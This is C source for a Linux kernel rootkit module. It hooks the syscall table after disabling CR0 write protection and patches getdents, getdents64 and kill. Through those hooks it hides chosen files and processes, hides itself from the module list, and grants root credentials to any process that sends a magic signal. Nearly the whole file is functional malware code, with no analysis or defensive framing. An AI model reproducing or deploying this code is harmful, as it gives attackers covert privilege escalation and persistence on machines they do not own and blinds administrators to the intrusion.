#include <linux/sched.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/version.h>
#include <linux/fdtable.h>
#include <asm/uaccess.h>
#include <linux/proc_ns.h>
#include "RootKit.h"


unsigned long cr0;
static unsigned long *__sys_call_table;
typedef asmlinkage int (*orig_getdents_t)(unsigned int, struct linux_dirent *,unsigned int);
typedef asmlinkage int (*orig_getdents64_t)(unsigned int,struct linux_dirent64 *, unsigned int);
typedef asmlinkage int (*orig_kill_t)(pid_t, int);

typedef asmlinkage long (*orig_open_t)(const char*, int);
//typedef asmlinkage long (*orig_lstat_t)(const char*, struct __old_kernel_stat*);
//typedef asmlinkage long (*orig_stat_t)(const char*, struct __old_kernel_stat*);

orig_getdents_t orig_getdents;
orig_getdents64_t orig_getdents64;
orig_kill_t orig_kill;

//orig_open_t orig_open;
//orig_lstat_t orig_lstat;
//orig_lstat_t orig_lstat;

//function to get the address of the system call table
unsigned long *
get_syscall_table_bf(void)
{
	unsigned long *syscall_table;
	unsigned long int i;

	for (i = (unsigned long int)sys_close; i < ULONG_MAX;
			i += sizeof(void *)) {
		syscall_table = (unsigned long *)i;

		if (syscall_table[__NR_close] == (unsigned long)sys_close)
			return syscall_table;
	}
	return NULL;
}

struct task_struct *
find_task(pid_t pid)
{
	struct task_struct *p = current;
	for_each_process(p) {
		if (p->pid == pid)
			return p;
	}
	return NULL;
}

int
is_invisible(pid_t pid)
{
	struct task_struct *task;
	if (!pid)
		return 0;
	task = find_task(pid);
	if (!task)
		return 0;
	if (task->flags & PF_INVISIBLE)
		return 1;
	return 0;
}


bool should_hide_file(const char __user *filename)
{
    char *kern_buff = NULL;
    int i;
    bool to_hide = false;

    
    kern_buff = kzalloc(strlen(filename)+1, GFP_KERNEL);
    if(!kern_buff)
    {
        //DEBUG("RAN OUT OF MEMORY in FILE FILTER");
        goto cleanup;
    }

    if(copy_from_user(kern_buff, filename, strlen(filename)))
    {   
        //DEBUG("PROBLEM COPYING FILENAME FROM USER in FILE Filter");
        goto cleanup;
    }
    

    for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
    {
        // Hidden file is found
        if(strstr(kern_buff, HIDDEN_FILES[i]) != NULL)
        {
            to_hide = true;
            break;
        }
    }
    
    //DEBUG("Exited HACKED OPEN");

cleanup:
    if(kern_buff)
        kfree(kern_buff);
    return to_hide;
}

// Intercepts open to see if the user is somehow trying
// to open a file that we are hiding.
/*
asmlinkage long hacked_open(const char __user *filename, int flags, umode_t mode)
{
    long ret;
    ret = orig_open(filename, flags, mode);
    if (should_hide_file(filename))
    {
        ret = -ENOENT;
    } 

    return ret;
}

asmlinkage long hacked_lstat(const char __user *filename,
            struct __old_kernel_stat __user *statbuf)
{
    long ret;

    ret = orig_lstat(filename, statbuf);

    if (should_hide_file(filename))
    {
        ret = -ENOENT;
    } 

    return ret;
    
}

asmlinkage long hacked_stat(const char __user *filename,
            struct __old_kernel_stat __user *statbuf)
{
    long ret;

    ret = orig_stat(filename, statbuf);

    if (should_hide_file(filename))
    {
        ret = -ENOENT;
    } 

    return ret;
}*/

// Will hide any files from within the dirp and return the new length of dirp
long handle_ls(struct linux_dirent *dirp, long length)
{
    
    unsigned int offset = 0;
    struct linux_dirent *cur_dirent;
    int i;
    struct dirent *new_dirp = NULL;
    int new_length = 0;
    bool isHidden = false;

    //struct dirent *moving_dirp = NULL;

    //DEBUG("Entering LS filter");
    // Create a new output buffer for the return of getdents
    new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
    if(!new_dirp)
    {
        //DEBUG("RAN OUT OF MEMORY in LS Filter");
        goto error;
    }

    // length is the length of memory (in bytes) pointed to by dirp
    while (offset < length)
    {
        char *dirent_ptr = (char *)(dirp);
        dirent_ptr += offset;
        cur_dirent = (struct linux_dirent *)dirent_ptr;

        isHidden = false;
        for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
        {
            // Hidden file is found
            if(strstr(cur_dirent->d_name, HIDDEN_FILES[i]) != NULL)
            {
	        // printk("HIDDEN FILE: %s\n", cur_dirent->d_name);
                isHidden = true;
                break;
            }
        }
        
        if (!isHidden)
        {
            memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
            new_length += cur_dirent->d_reclen;
        }
        offset += cur_dirent->d_reclen;
    }
    //DEBUG("Exiting LS filter");

    memcpy(dirp, new_dirp, new_length);
    length = new_length;

cleanup:
    if(new_dirp)
        kfree(new_dirp);
    return length;
error:
    goto cleanup;
}

long handle_ls64(struct linux_dirent64 *dirp, long length)
{
    
    unsigned int offset = 0;
    struct linux_dirent64 *cur_dirent;
    int i;
    struct dirent *new_dirp = NULL;
    int new_length = 0;
    bool isHidden = false;

    //struct dirent *moving_dirp = NULL;

    //DEBUG("Entering LS filter");
    // Create a new output buffer for the return of getdents
    new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
    if(!new_dirp)
    {
        //DEBUG("RAN OUT OF MEMORY in LS Filter");
        goto error;
    }

    // length is the length of memory (in bytes) pointed to by dirp
    while (offset < length)
    {
        char *dirent_ptr = (char *)(dirp);
        dirent_ptr += offset;
        cur_dirent = (struct linux_dirent64 *)dirent_ptr;

        isHidden = false;
        for(i=0; i<sizeof(HIDDEN_FILES)/sizeof(char *); i++)
        {
            // Hidden file is found
            if(strstr(cur_dirent->d_name, HIDDEN_FILES[i]) != NULL)
            {
	        // printk("HIDDEN FILE: %s\n", cur_dirent->d_name);
                isHidden = true;
                break;
            }
        }
        
        if (!isHidden)
        {
            memcpy((void *) new_dirp+new_length, cur_dirent, cur_dirent->d_reclen);
            new_length += cur_dirent->d_reclen;
        }
        offset += cur_dirent->d_reclen;
    }
    //DEBUG("Exiting LS filter");

    memcpy(dirp, new_dirp, new_length);
    length = new_length;

cleanup:
    if(new_dirp)
        kfree(new_dirp);
    return length;
error:
    goto cleanup;
}


//function responsible for hiding processes (64 bit version)
asmlinkage int
hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents64(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	// Entry point into hiding files function
    ret = handle_ls64(dirent, ret);

	kdirent = kzalloc(ret, GFP_KERNEL);

	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);
	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}
//function responsible for hiding processes (32 bit)
asmlinkage int
hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
	unsigned int count)
{
	int ret = orig_getdents(fd, dirent, count), err;
	unsigned short proc = 0;
	unsigned long off = 0;
	struct linux_dirent *dir, *kdirent, *prev = NULL;
	struct inode *d_inode;

	if (ret <= 0)
		return ret;

	// Entry point into hiding files function
    ret = handle_ls(dirent, ret);

	kdirent = kzalloc(ret, GFP_KERNEL);

	if (kdirent == NULL)
		return ret;

	err = copy_from_user(kdirent, dirent, ret);

	if (err)
		goto out;

	d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)
		/*&& MINOR(d_inode->i_rdev) == 1*/)
		proc = 1;

	while (off < ret) {
		dir = (void *)kdirent + off;
		if (proc &&
		is_invisible(simple_strtoul(dir->d_name, NULL, 10))) {
			if (dir == kdirent) {
				ret -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, ret);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, ret);
	if (err)
		goto out;
out:
	kfree(kdirent);
	return ret;
}
// function to give root to the current process.
void
give_root(void)
{
	
		struct cred *newcreds;
		newcreds = prepare_creds();
		if (newcreds == NULL)
			return;	
		newcreds->uid.val = newcreds->gid.val = 0;
		newcreds->euid.val = newcreds->egid.val = 0;
		newcreds->suid.val = newcreds->sgid.val = 0;
		newcreds->fsuid.val = newcreds->fsgid.val = 0;
		commit_creds(newcreds);
	
}

static inline void
tidy(void)
{
	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
}

static struct list_head *module_previous;
static short module_hidden = 0;
void
module_show(void)
{
	list_add(&THIS_MODULE->list, module_previous);
	module_hidden = 0;
}

void
module_hide(void)
{
	module_previous = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);
	module_hidden = 1;
}
// the hacked kill function which performs the normal kill operation besides our commands. 
asmlinkage int
hacked_kill(pid_t pid, int sig)
{
	struct task_struct *task;

	switch (sig) {
		case HIDEPROC:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			task->flags ^= PF_INVISIBLE;
			break;
		case ROOT:
			give_root();
			break;
		case HIDEMOD:
			if (module_hidden) module_show();
			else module_hide();
			break;
		case HIDEFILE:
			should_hide_file("RootKit.ko");
		default:
			return orig_kill(pid, sig);
	}
	return 0;
}

static inline void
protect_memory(void)
{
	write_cr0(cr0);
}

static inline void
unprotect_memory(void)
{
	write_cr0(cr0 & ~0x00010000);
}


// main function
static int __init
RootKit_init(void)
{
	__sys_call_table = get_syscall_table_bf();
	if (!__sys_call_table)
		return -1;

	cr0 = read_cr0();
	tidy();

	orig_getdents = (orig_getdents_t)__sys_call_table[__NR_getdents];
	orig_getdents64 = (orig_getdents64_t)__sys_call_table[__NR_getdents64];
	orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];

	//orig_open = (orig_open_t)__sys_call_table[__NR_open];
	//orig_lstat = (orig_lstat_t)__sys_call_table[__NR_lstat];
	//orig_stat = (orig_stat_t)__sys_call_table[__NR_stat];

	unprotect_memory();
	__sys_call_table[__NR_getdents] = (unsigned long)hacked_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long)hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)hacked_kill;

	//__sys_call_table[__NR_open] = (unsigned long)hacked_open;
	//__sys_call_table[__NR_lstat] = (unsigned long)hacked_lstat;
	//__sys_call_table[__NR_stat] = (unsigned long)hacked_stat;

	protect_memory();

	return 0;
}

static void __exit
RootKit_cleanup(void)
{
	unprotect_memory();
	__sys_call_table[__NR_getdents] = (unsigned long)orig_getdents;
	__sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long)orig_kill;
	protect_memory();
}

module_init(RootKit_init);
module_exit(RootKit_cleanup);

MODULE_LICENSE("Dual BSD/GPL");
MODULE_AUTHOR("rootkit");
MODULE_DESCRIPTION("rootkit");
